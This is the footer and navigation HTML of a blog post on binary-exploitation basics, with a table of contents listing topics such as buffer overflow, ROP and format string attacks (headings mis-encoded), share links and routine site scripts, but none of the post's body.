          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">ç°¡ä»‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E8%A6%81%E6%9C%83%E7%9A%84%E5%B7%A5%E5%85%B7-%E7%9F%A5%E8%AD%98"><span class="toc-number">3.</span> <span class="toc-text">æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Program-Structure"><span class="toc-number">4.</span> <span class="toc-text">Program Structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pwntools"><span class="toc-number">5.</span> <span class="toc-text">Python Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E5%80%91"><span class="toc-number">5.1.</span> <span class="toc-text">æŒ‡ä»¤å€‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-number">5.2.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">6.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-1"><span class="toc-number">6.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2code"><span class="toc-number">7.</span> <span class="toc-text">BOF Ret2code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-1"><span class="toc-number">7.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">7.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-2"><span class="toc-number">7.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2ShellCode"><span class="toc-number">8.</span> <span class="toc-text">BOF Ret2ShellCode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-2"><span class="toc-number">8.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">8.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-3"><span class="toc-number">8.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2Lib"><span class="toc-number">9.</span> <span class="toc-text">BOF Ret2Lib</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-3"><span class="toc-number">9.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">9.2.</span> <span class="toc-text">åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lazy-Binding-%E6%A9%9F%E5%88%B6"><span class="toc-number">9.2.1.</span> <span class="toc-text">Lazy Binding æ©Ÿåˆ¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Libc-Base"><span class="toc-number">9.2.2.</span> <span class="toc-text">Libc Base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95"><span class="toc-number">9.2.3.</span> <span class="toc-text">æ‰‹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-4"><span class="toc-number">9.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-Hijacking"><span class="toc-number">10.</span> <span class="toc-text">GOT Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-4"><span class="toc-number">10.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.2.</span> <span class="toc-text">åŸç†</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oriented-Programming"><span class="toc-number">11.</span> <span class="toc-text">Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-5"><span class="toc-number">11.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">11.2.</span> <span class="toc-text">åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-Gadget"><span class="toc-number">11.2.1.</span> <span class="toc-text">ROP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">æ‰‹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-5"><span class="toc-number">11.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Attack"><span class="toc-number">12.</span> <span class="toc-text">Format String Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-6"><span class="toc-number">12.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">12.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B1"><span class="toc-number">12.3.</span> <span class="toc-text">ç¯„ä¾‹1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B2"><span class="toc-number">12.4.</span> <span class="toc-text">ç¯„ä¾‹2</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/12/pwn-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/12/pwn-note/&text=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/12/pwn-note/&is_video=false&description=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PwnåŸºç¤ç­†è¨˜&body=Check out this article: http://wha13.github.io/2023/10/12/pwn-note/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/12/pwn-note/&name=PwnåŸºç¤ç­†è¨˜&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/12/pwn-note/&t=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
